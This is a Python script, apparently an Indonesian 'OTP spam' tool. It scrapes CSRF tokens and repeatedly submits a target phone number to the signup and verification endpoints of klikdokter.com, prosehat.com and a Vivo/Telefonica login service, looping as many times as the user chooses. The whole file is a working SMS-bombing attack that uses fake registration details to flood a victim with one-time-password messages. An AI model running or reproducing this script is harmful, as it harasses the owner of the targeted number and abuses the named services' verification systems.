
import requests,os,sys,time
from bs4 import BeautifulSoup as BS

class docter:
	def __init__(self):
		self.ses=requests.Session()

	def alodoc(self,num):
		self.ses.headers.update({'referer':'https://login.vivo.com.br/loginmarca/appmanager/marca/publico?acesso=paravoce'})
		req1=self.ses.get('https://login.vivo.com.br/loginmarca/appmanager/marca/publico?acesso=paravoce')
		bs1=BS(req1.text,'html.parser')
		token=bs1.find('meta',{'name':'csrf-token'})['content']
#		print(token)

		head={
			'user-agent':'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'content-type':'application/json',
			'referer':'https://login.vivo.com.br/loginmarca/appmanager/marca/publico?acesso=paravoce',
			'accept':'application/json',
			'origin':'https://login.vivo.com.br/',
			'x-csrf-token':token
		}
		req2=self.ses.post('https://br.mobileconnect.telefonica.com/br/authrouter/authenticate?jwt=eyJraWQiOiJ0ZGFmLWFwaS1hdXRoc2VydmVyIiwiY29yciI6IkFVUy1kOTFhMzFjNC03MGJjLTQzNzUtOWM3NC0wYmQ0OWJiNDFhZWIiLCJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIn0..CaYvKvXa9-P_nyWojU80oA.5U8Yc_nWLUnVpL3TK4RHlcQ-NYDq_vpiswzNfOUzIJcKlYQ_oAUzk-vb0a_RtbXqdS01xI2nJn4xO4lB42PTRRG_tatQ0_znoy2BY8EWA8oC_SHvSw8et_P_NaOjOckhFP5iMlGQEZ9jaSsfQhWPnPLq1cPy6XAcWwtYj9-bggzyx-JE5FghUtaPXsbgG7UsTdgHYj3XLa2w60VHZLfXxJBNyUPMxHgxnsI4I2oT21KlUTSbV5IxOjP_fsTMb1BCpkow9bd0uzZ-2r_oM-YO76x1zqDF6dzRIQ0Ly8Iq8auVHapyu8dN22BHYxUkmVo22DzfJufdxO_LbkkpD7XF0kPNjRPiKLm2_fCo0c0f-Xh5khXQi9n2BK7oqZdrOqqViOpYHdDZ0SgCM2ENL52DGoKymk4e2EOlbfMNgtpqVhuGC6JoSOMve4GcewXMQAdHJ8I7I_WatgfvHjIt-1EjLcmziK22n2rUuybzI-DCnhBe3mUnkBtKnvITUTdJDfKa.7qqKhCeiabBbuHV4ugFbCIhI6zLecdR-YjvwSv96zRA',headers=head,json={"user":{"phone":num}})
#		print(req2.json())
		if req2.json()['status'] == 'success':
			print("[•] Berhasil")
		else:
			print("[-] Gagal")

	def klikdok(self,num):
		req1=self.ses.get('https://m.klikdokter.com/users/create')
		bs=BS(req1.text,'html.parser')
		token=bs.find('input',{'name':'_token'})['value']
#		print(token)

		head={
			'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Origin': 'https://m.klikdokter.com',
			'Upgrade-Insecure-Requests': '1',
			'Content-Type': 'application/x-www-form-urlencoded',
			'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Referer': 'https://m.klikdokter.com/users/create?back-to=',
		}
		ata={
			'_token':token,
			'full_name':'BambangSubianto',
			'email':'Hsjakaj@jskaka.com',
			'phone':num,
			'back-to':'',
			'submit':'Daftar',
		}

		req2=self.ses.post('https://m.klikdokter.com/users/check',headers=head,data=ata)
#		print(req2.url)
		if "sessions/auth?user=" in req2.url:
			print("[•] Berhasil")
		else:
			print("[-] Gagal")

	def prosehat(self,num):
		head={
			'accept': 'application/json, text/javascript, */*; q=0.01',
			'origin': 'https://www.prosehat.com',
			'x-requested-with': 'XMLHttpRequest',
			'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'referer': 'https://www.prosehat.com/akun',
		}
		ata={'phone_or_email':num,'action':'ajaxverificationsend'}

		req=requests.post('https://www.prosehat.com/wp-admin/admin-ajax.php',data=ata,headers=head)
#		print(req.text)
		if "token" in req.text:
			print("[•] Berhasil")
			for x in range(60):
				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
				time.sleep(1)
			print()
		else:
			print(f"[-] Gagal {req.text}")
			for x in range(60):
				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
				time.sleep(1)
			print()

while True:
	try:
		os.system('clear')
		print("""
		[ Tanya Dokter OTP ]
		 - By Kang-Newbie -

[ Spam List ]
1. Alodokter.com
2. Klikdokter.com
3. Prosehat.com
	""")
		pil=int(input("> Pilih: "))
		print("="*25)
		num=input("[?] Nomor Target: ")
		lop=int(input("[?] Looping: "))
		print()

		main=docter()
		if pil == 1:
			for i in range(lop):
				main.alodoc(num)
		elif pil == 2:
			for i in range(lop):
				main.klikdok(num)
		elif pil == 3:
			for i in range(lop):
				main.prosehat(num)
		else:
			print("?: Anda Buta!?")

		lgi=input("\n[?] Coba lagi (Y/n) ")
		if lgi.lower() == 'n':
			sys.exit('GOODBYE :*')
	except Exception as Err:
		sys.exit(Err)
